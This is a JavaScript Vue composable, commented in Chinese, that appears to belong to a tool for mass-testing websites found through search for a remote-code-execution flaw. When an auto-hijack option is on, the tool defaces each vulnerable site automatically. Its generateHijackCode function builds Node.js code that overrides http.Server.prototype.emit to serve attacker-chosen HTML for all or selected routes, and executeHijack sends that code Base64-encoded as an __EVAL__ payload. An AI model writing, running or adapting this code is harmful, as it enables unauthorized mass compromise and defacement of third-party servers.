/**
 * 批量验证功能 Composable
 * 负责批量 POC 验证逻辑
 */
import { ref, nextTick, unref } from 'vue'

export function useBatchVerify(
  batchSettings,
  searchResultsCache,
  currentPage,
  totalPages,
  autoHijackEnabled
) {
  const batchVerifying = ref(false)
  const batchVerifyPaused = ref(false)
  const batchVerifyStats = ref({
    total: 0,
    safe: 0,
    vulnerable: 0,
    error: 0,
    hijacked: 0,
    hijackFailed: 0
  })
  const currentHighlightedRow = ref(null)
  const resultsBodyRef = ref(null)
  const isChangingPage = ref(false) // 防止重复触发页面切换

  // 清除之前高亮的行
  const clearHighlightedRow = () => {
    if (currentHighlightedRow.value) {
      currentHighlightedRow.value.style.backgroundColor = ''
      currentHighlightedRow.value = null
    }
  }

  // 滚动到正在验证的行
  const scrollToVerifyingRow = async (rowIndex) => {
    try {
      await nextTick()
      await new Promise((resolve) => setTimeout(resolve, 150))

      if (!resultsBodyRef.value) {
        console.log('[滚动] resultsBodyRef 不存在')
        return
      }

      const rows = resultsBodyRef.value.querySelectorAll('.results-table tbody tr')
      console.log(`[滚动] 找到 ${rows.length} 行，尝试滚动到第 ${rowIndex} 行`)

      if (!rows || rows.length === 0) {
        console.log('[滚动] 未找到表格行')
        return
      }

      if (rowIndex >= rows.length) {
        console.log(`[滚动] 行索引超出范围: ${rowIndex} >= ${rows.length}`)
        return
      }

      const targetRow = rows[rowIndex]
      if (!targetRow) {
        return
      }

      clearHighlightedRow()

      targetRow.style.transition = 'background-color 0.3s ease'
      targetRow.style.backgroundColor = 'rgba(33, 150, 243, 0.2)'
      currentHighlightedRow.value = targetRow

      const scrollContainer = resultsBodyRef.value

      const rowOffsetTop = targetRow.offsetTop
      const containerHeight = scrollContainer.clientHeight
      const rowHeight = targetRow.clientHeight

      const targetScrollTop = rowOffsetTop - containerHeight / 2 + rowHeight / 2

      console.log('[滚动] 容器高度:', containerHeight)
      console.log('[滚动] 行偏移:', rowOffsetTop)
      console.log('[滚动] 目标滚动位置:', targetScrollTop)
      console.log('[滚动] 当前滚动位置:', scrollContainer.scrollTop)

      scrollContainer.scrollTo({
        top: Math.max(0, targetScrollTop),
        behavior: 'smooth'
      })

      console.log('[滚动] ✓ 滚动命令已执行')
    } catch (error) {
      console.error('[滚动] 滚动失败:', error)
    }
  }

  // 添加到漏洞历史记录
  const addToVulnHistory = async (url) => {
    try {
      console.log('正在保存漏洞历史:', url)
      const result = await window.api.storage.addHistoryItem(url)
      if (result.success) {
        console.log('✓ 漏洞历史保存成功')
      } else {
        console.error('✗ 漏洞历史保存失败:', result.error)
      }
    } catch (error) {
      console.error('保存漏洞历史失败:', error)
    }
  }

  // Base64 编码函数
  const base64Encode = (str) => {
    return btoa(unescape(encodeURIComponent(str)))
  }

  // 生成劫持代码
  const generateHijackCode = (route, html) => {
    const escapedHtml = html.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')

    if (route === '*') {
      // 全局劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(\`${escapedHtml}\`);return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    } else {
      // 指定路由劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}if(!global.__hijackRoutes){global.__hijackRoutes=new Map();}global.__hijackRoutes.set('${route}',\`${escapedHtml}\`);h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'&&global.__hijackRoutes.has(p.pathname)){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(global.__hijackRoutes.get(p.pathname));return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    }
  }

  // 执行挂黑
  const executeHijack = async (url, settings) => {
    try {
      // 加载批量挂黑模板（独立于 POC 挂黑模板）
      const result = await window.api.storage.loadSettings()
      let hijackHtml = ''

      if (result.success && result.settings?.batchHijackHtmlCache) {
        hijackHtml = result.settings.batchHijackHtmlCache
      } else {
        // 使用统一的默认模板
        const { getDefaultHijackTemplate } = await import('../config/hijackTemplate')
        hijackHtml = getDefaultHijackTemplate()
      }

      const route = settings.hijackRouteMode === 'global' ? '*' : settings.hijackTargetRoute
      const hijackCode = generateHijackCode(route, hijackHtml)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const hijackResult = await window.api.executePOC(url, command)

      if (hijackResult.success && hijackResult.data.is_vulnerable) {
        console.log('✓ 挂黑成功:', url)
        return true
      } else {
        console.error('✗ 挂黑失败:', url, hijackResult.error)
        return false
      }
    } catch (error) {
      console.error('挂黑错误:', error)
      return false
    }
  }

  // 执行批量验证的核心逻辑
  const executeBatchVerify = async (loadPageData) => {
    try {
      const startPageNum = currentPage.value
      const totalPagesCount = totalPages.value

      // 只验证当前页
      const currentPageNum = startPageNum

      if (!searchResultsCache.value[currentPageNum]) {
        await loadPageData(currentPageNum)
      }

      const pageResults = searchResultsCache.value[currentPageNum] || []

      for (let i = 0; i < pageResults.length; i++) {
        const item = pageResults[i]

        if (!batchVerifying.value) {
          clearHighlightedRow()
          return
        }

        if (item.pocStatus !== 'pending') continue

        item.pocStatus = 'checking'
        batchVerifyStats.value.total++

        await scrollToVerifyingRow(i)

        try {
          const response = await window.api.executePOC(
            item.fullUrl,
            batchSettings.value.verifyCommand
          )

          if (!response.success) {
            item.pocStatus = 'error'
            batchVerifyStats.value.error++
            clearHighlightedRow()
            continue
          }

          const result = response.data

          if (result.is_vulnerable && result.digest_content) {
            // 先显示存在漏洞状态
            item.pocStatus = 'vulnerable'
            batchVerifyStats.value.vulnerable++
            await addToVulnHistory(item.fullUrl)

            console.log('[批量挂黑] 检测到漏洞:', item.fullUrl)
            console.log('[批量挂黑] autoHijackEnabled:', unref(autoHijackEnabled))
            console.log('[批量挂黑] 完整设置:', batchSettings.value)

            // 如果启用了自动挂黑，等待1秒后执行挂黑
            if (unref(autoHijackEnabled)) {
              console.log('[批量挂黑] 开始挂黑流程...')
              // 等待1秒
              await new Promise((resolve) => setTimeout(resolve, 1000))

              // 显示正在挂黑状态
              item.pocStatus = 'hijacking'

              // 执行挂黑
              const hijackSuccess = await executeHijack(item.fullUrl, batchSettings.value)
              if (hijackSuccess) {
                item.pocStatus = 'hijacked'
                batchVerifyStats.value.hijacked++
                // 漏洞数减1（因为已经挂黑了）
                batchVerifyStats.value.vulnerable--
                console.log('✓ 自动挂黑成功:', item.fullUrl)
              } else {
                item.pocStatus = 'hijack-failed'
                batchVerifyStats.value.hijackFailed = (batchVerifyStats.value.hijackFailed || 0) + 1
                console.log('✗ 自动挂黑失败:', item.fullUrl)
              }
            }
          } else if (result.command_failed || !result.is_vulnerable) {
            if (result.command_failed) {
              item.pocStatus = 'error'
              batchVerifyStats.value.error++
            } else {
              item.pocStatus = 'safe'
              batchVerifyStats.value.safe++
            }
          } else {
            item.pocStatus = 'safe'
            batchVerifyStats.value.safe++
          }

          clearHighlightedRow()
        } catch (error) {
          console.error('POC 验证失败:', error)
          item.pocStatus = 'error'
          batchVerifyStats.value.error++
          clearHighlightedRow()
        }

        await new Promise((resolve) => setTimeout(resolve, 100))
      }

      // 当前页验证完成后，如果还有下一页，自动跳转
      if (currentPageNum < totalPagesCount && batchVerifying.value && !isChangingPage.value) {
        console.log(`当前页 ${currentPageNum} 验证完成，跳转到下一页 ${currentPageNum + 1}`)

        // 设置标志，防止重复触发
        isChangingPage.value = true

        try {
          currentPage.value = currentPageNum + 1

          // 等待页面切换完成
          await nextTick()
          await new Promise((resolve) => setTimeout(resolve, 500))

          // 重置标志
          isChangingPage.value = false

          // 递归调用，继续验证下一页
          return await executeBatchVerify(loadPageData)
        } catch (error) {
          isChangingPage.value = false
          throw error
        }
      }

      if (batchVerifying.value) {
        clearHighlightedRow()
        return {
          success: true,
          message: `批量验证完成！安全: ${batchVerifyStats.value.safe}, 漏洞: ${batchVerifyStats.value.vulnerable}, 错误: ${batchVerifyStats.value.error}`
        }
      }
    } catch (error) {
      console.error('批量验证出错:', error)
      clearHighlightedRow()
      return { success: false, error: error.message }
    } finally {
      batchVerifying.value = false
      batchVerifyPaused.value = false
      isChangingPage.value = false // 重置标志
    }
  }

  // 开始批量验证
  const startBatchVerify = async (loadPageData, showSnackbar) => {
    if (batchVerifying.value) return

    batchVerifying.value = true
    batchVerifyPaused.value = false
    isChangingPage.value = false // 重置标志

    batchVerifyStats.value = {
      total: 0,
      safe: 0,
      vulnerable: 0,
      error: 0,
      hijacked: 0,
      hijackFailed: 0
    }

    showSnackbar('开始批量验证...', 'info')
    const result = await executeBatchVerify(loadPageData)
    if (result) {
      if (result.success) {
        showSnackbar(result.message, 'success')
      } else {
        showSnackbar('批量验证出错: ' + result.error, 'error')
      }
    }
  }

  // 暂停批量验证
  const pauseBatchVerify = (showSnackbar) => {
    batchVerifying.value = false
    batchVerifyPaused.value = true
    isChangingPage.value = false // 重置标志
    clearHighlightedRow()
    showSnackbar('批量验证已暂停', 'info')
  }

  // 继续批量验证
  const resumeBatchVerify = async (loadPageData, showSnackbar) => {
    batchVerifyPaused.value = false
    batchVerifying.value = true
    isChangingPage.value = false // 重置标志
    showSnackbar('继续批量验证...', 'info')
    const result = await executeBatchVerify(loadPageData)
    if (result) {
      if (result.success) {
        showSnackbar(result.message, 'success')
      } else {
        showSnackbar('批量验证出错: ' + result.error, 'error')
      }
    }
  }

  // 切换批量验证状态
  const toggleBatchVerify = (loadPageData, showSnackbar) => {
    if (batchVerifying.value) {
      pauseBatchVerify(showSnackbar)
    } else if (batchVerifyPaused.value) {
      resumeBatchVerify(loadPageData, showSnackbar)
    } else {
      startBatchVerify(loadPageData, showSnackbar)
    }
  }

  return {
    batchVerifying,
    batchVerifyPaused,
    batchVerifyStats,
    currentHighlightedRow,
    resultsBodyRef,
    clearHighlightedRow,
    scrollToVerifyingRow,
    addToVulnHistory,
    executeBatchVerify,
    startBatchVerify,
    pauseBatchVerify,
    resumeBatchVerify,
    toggleBatchVerify
  }
}
